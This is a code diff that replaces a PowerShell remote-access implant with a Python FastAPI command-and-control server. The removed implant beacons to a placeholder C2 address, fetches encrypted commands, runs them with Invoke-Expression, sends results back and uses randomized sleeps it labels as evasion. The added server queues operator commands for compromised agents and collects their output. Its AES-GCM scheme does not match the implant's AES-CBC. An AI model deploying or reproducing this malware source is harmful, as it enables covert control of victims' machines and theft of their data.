@@ -8,134 +8,192 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 #########################################################################################################################################################################################################################
 
-$ErrorActionPreference = "Stop"
+from fastapi import FastAPI, HTTPException, Query
+from pydantic import BaseModel
+from typing import Dict
+import logging
+import base64
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Util.Padding import pad, unpad
+import uvicorn
 
-# Function to load or generate AgentID
-Function Load-AgentID {
-    Param ([string]$FilePath)
-    If (Test-Path $FilePath) {
-        $AgentID = (Get-Content $FilePath -Raw).Trim()
-        return $AgentID
-    } Else {
-        $AgentID = [guid]::NewGuid().ToString()
-        Set-Content -Path $FilePath -Value $AgentID
-        return $AgentID
-    }
-}
+app = FastAPI()
+agents: Dict[str, Dict] = {}
 
-# Function to send beacon to C2 server with time-based evasion
-Function Send-Beacon {
-    Param ([string]$AgentID, [string]$C2Url, [byte[]]$AESKey)
-    Try {
-        $Body = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
-        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
+# Configuring logging
+logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
 
-        Write-Host "[*] Sending beacon..."
-        $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
-        $EncryptedCommand = $Response.data
+class CheckinRequest(BaseModel):
+    AgentID: str
 
-        $AES = New-Object System.Security.Cryptography.AesManaged
-        $AES.Key = $AESKey
-        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $CommandBytes = [Convert]::FromBase64String($EncryptedCommand)
-        $IV = $CommandBytes[0..15]
-        $CipherText = $CommandBytes[16..($CommandBytes.Length - 1)]
-        $Decryptor = $AES.CreateDecryptor($AES.Key, $IV)
-        $Command = [System.Text.Encoding]::UTF8.GetString($Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length))
+class ResultRequest(BaseModel):
+    AgentID: str
+    Result: str
 
-        If ($Command -ne "NoCommand") {
-            Write-Host "[*] Executing command: $Command"
-            $Result = Invoke-Expression $Command | Out-String
-            $Result = $Result -replace "`r`n", "`n"
-            Send-Result -AgentID $AgentID -C2Url $C2Url -Result $Result -AESKey $AESKey
-        }
-    } Catch {
-        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
-    }
-}
+class CommandRequest(BaseModel):
+    AgentID: str
+    Command: str
 
-# Function to send execution result
-Function Send-Result {
-    Param ([string]$AgentID, [string]$C2Url, [string]$Result, [byte[]]$AESKey)
-    Try {
-        $AES = New-Object System.Security.Cryptography.AesManaged
-        $AES.Key = $AESKey
-        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $Encryptor = $AES.CreateEncryptor()
-        $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
-        $CipherText = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)
-        $IV = $AES.IV
-        $EncryptedResult = [Convert]::ToBase64String($IV + $CipherText)
-        
-        $Body = @{ AgentID = $AgentID; Result = $EncryptedResult } | ConvertTo-Json -Compress
-        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
+class KeyExchangeRequest(BaseModel):
+    AgentID: str
+    EncAESKey: str
 
-        Write-Host "[*] Sending result..."
-        Invoke-RestMethod -Uri "$C2Url/result" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
-    } Catch {
-        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
-    }
-}
+class BeaconRequest(BaseModel):
+    AgentID: str
 
-# Main execution
-Try {
-    $AgentIDFilePath = "C:\Temp\agent_id.txt"
-    $AgentID = Load-AgentID -FilePath $AgentIDFilePath
-    $C2Url = "http://c2_server_IP:8000"
+# Load RSA Public Key in XML Format
+try:
+    with open("public_key.xml", "r") as xml_file:
+        PUBLIC_KEY_XML = xml_file.read()
+except FileNotFoundError:
+    logging.error("public_key.xml not found!")
+    PUBLIC_KEY_XML = ""
 
-    Write-Host "[*] Fetching Public Key..."
-    $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
-    If (-Not $PublicKeyResponse.PublicKey) { Throw "[-] Failed to retrieve public key" }
-    $PublicKeyXML = $PublicKeyResponse.PublicKey
-
-    Function Import-RSAKey ($PublicKeyXML) {
-        $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
-        $rsa.FromXmlString($PublicKeyXML)
-        return $rsa
-    }
-    $RSA = Import-RSAKey $PublicKeyXML
-
-    # Generate AES Key with polymorphic behavior
-    $AESKey = New-Object byte[] 32
-    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
-    $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
+@app.get("/public_key")
+def get_public_key():
+    """Send public key in XML format to agents."""
+    if not PUBLIC_KEY_XML:
+        raise HTTPException(status_code=500, detail="Public key not found")
     
-    # Encrypt AES Key with RSA
-    $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
-    $EncryptedAESKeyBase64 = [Convert]::ToBase64String($EncryptedAESKey)
+    logging.info("Public key requested")
+    return {"PublicKey": PUBLIC_KEY_XML}
+
+def check_key_length(key: bytes) -> bytes:
+    if len(key) not in [16, 24, 32]:
+        raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
+    return key
+
+def encrypt_data(data: str, key: bytes) -> str:
+    key = check_key_length(key)
+    cipher = AES.new(key, AES.MODE_GCM)
+    nonce = cipher.nonce
+    ct_bytes, tag = cipher.encrypt_and_digest(data.encode())
+    encrypted_data = base64.b64encode(nonce + ct_bytes + tag).decode('utf-8')
+    return encrypted_data
+
+def decrypt_data(data: str, key: bytes) -> str:
+    key = check_key_length(key)
+    try:
+        raw_data = base64.b64decode(data)
+        nonce, ct, tag = raw_data[:12], raw_data[12:-16], raw_data[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        pt = cipher.decrypt_and_verify(ct, tag)
+        return pt.decode('utf-8')
+    except Exception as e:
+        logging.error(f"Decryption failed: {str(e)}")
+        raise HTTPException(status_code=400, detail="Decryption failed")
+
+def load_private_key():
+    with open("private_key.pem", "rb") as f:
+        private_key = RSA.import_key(f.read())
+    return private_key
+
+def decrypt_aes_key(enc_aes_key_base64, private_key):
+    enc_aes_key = base64.b64decode(enc_aes_key_base64)
+    cipher_rsa = PKCS1_OAEP.new(private_key)
+    aes_key = cipher_rsa.decrypt(enc_aes_key)
+    return aes_key
+
+private_key = load_private_key()
+
+@app.post("/exchange_key")
+def exchange_key(request: KeyExchangeRequest):
+    """Handle the key exchange request from agents."""
+    agent_id = request.AgentID
+    enc_aes_key = request.EncAESKey
+    try:
+        aes_key = decrypt_aes_key(enc_aes_key, private_key)
+        agents[agent_id] = {"aes_key": aes_key, "commands": [], "results": []}
+        logging.info(f"Key exchange successful for AgentID: {agent_id}")
+        return {"Status": "Success"}
+    except Exception as e:
+        logging.error(f"Key exchange failed for AgentID {agent_id}: {str(e)}")
+        raise HTTPException(status_code=400, detail="Key exchange failed")
+
+@app.post("/beacon")
+def beacon(request: BeaconRequest):
+    """Handle beacon from agents to keep the connection alive."""
+    agent_id = request.AgentID
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
     
-    $Body = @{ AgentID = $AgentID; EncAESKey = $EncryptedAESKeyBase64 } | ConvertTo-Json -Compress
-    $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
-
-    Write-Host "[*] Sending encrypted AES key..."
-    $Response = Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
-    If ($Response.Status -ne "Success") { Throw "[-] Key exchange failed." }
-
-    # Check-in
-    $CheckinBody = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
-    $CheckinBody = [System.Text.Encoding]::UTF8.GetBytes($CheckinBody)
-    Invoke-RestMethod -Uri "$C2Url/checkin" -Method POST -Body $CheckinBody -ContentType "application/json; charset=utf-8"
+    aes_key = agents[agent_id]["aes_key"]
+    # Check for pending commands
+    if agents[agent_id]["commands"]:
+        command = agents[agent_id]["commands"].pop(0)
+        response = encrypt_data(command, aes_key)
+        logging.info(f"Sent command '{command}' to agent {agent_id}")
+    else:
+        response = encrypt_data("NoCommand", aes_key)
+        logging.info(f"No commands for agent {agent_id}")
     
-    Write-Host "[*] Agent check-in completed."
+    return {"data": response}
 
-    # Time-based evasion
-    $SleepTime = Get-Random -Minimum 10 -Maximum 60
-    Write-Host "[*] Sleeping for $SleepTime seconds before starting beacon loop."
-    Start-Sleep -Seconds $SleepTime
+@app.post("/checkin")
+def checkin(request: CheckinRequest):
+    agent_id = request.AgentID
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
 
-    While ($true) {
-        Try {
-            Send-Beacon -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
-        } Catch {
-            $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
-        }
-        $DynamicSleep = Get-Random -Minimum 10 -Maximum 30
-        Start-Sleep -Seconds $DynamicSleep
-    }
-}
-Catch {
-    $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
-    Start-Sleep -Seconds 10
-}
+    aes_key = agents[agent_id]["aes_key"]
+    if agents[agent_id]["commands"]:
+        command = agents[agent_id]["commands"].pop(0)
+        response = encrypt_data(command, aes_key)
+    else:
+        response = encrypt_data("NoCommand", aes_key)
+
+    return {"data": response}
+
+@app.post("/result")
+def result(request: ResultRequest):
+    agent_id = request.AgentID
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
+    try:
+        decrypted_result = decrypt_data(request.Result, agents[agent_id]["aes_key"])
+        # Append the result to the agent's result list
+        agents[agent_id]["results"].append(decrypted_result)
+        message = f"Agent {agent_id} executed command with result: {decrypted_result}"
+        logging.info(message)
+        print(message, flush=True)  # Print to console for real-time monitoring
+    except Exception as e:
+        logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
+        raise HTTPException(status_code=400, detail="Decryption failed")
+
+    return {"Status": "OK"}
+
+@app.get("/list_agents")
+def list_agents():
+    return {"agents": [{"AgentID": agent_id} for agent_id in agents]}
+
+@app.post("/sendcommand")
+def send_command(request: CommandRequest):
+    agent_id = request.AgentID
+    command = request.Command
+    if agent_id in agents:
+        agents[agent_id]["commands"].append(command)
+        logging.info(f"Command sent to agent {agent_id}: {command}")
+        return {"Status": "Command sent"}
+    raise HTTPException(status_code=404, detail="Agent not found")
+
+@app.get("/result")
+def get_result(agent_id: str = Query(..., alias="agent_id")):
+    """Get the result of the last command executed by the agent."""
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
+    if agents[agent_id]["results"]:
+        result = agents[agent_id]["results"].pop(0)
+        logging.info(f"Fetched result for agent {agent_id}: {result}")
+        return {"Result": result}
+    else:
+        logging.info(f"No results available for agent {agent_id}")
+        return {"Result": "No result available"}
+
+def run_server():
+    uvicorn.run(app, host="0.0.0.0", port=8000)
+
+if __name__ == "__main__":
+    run_server()
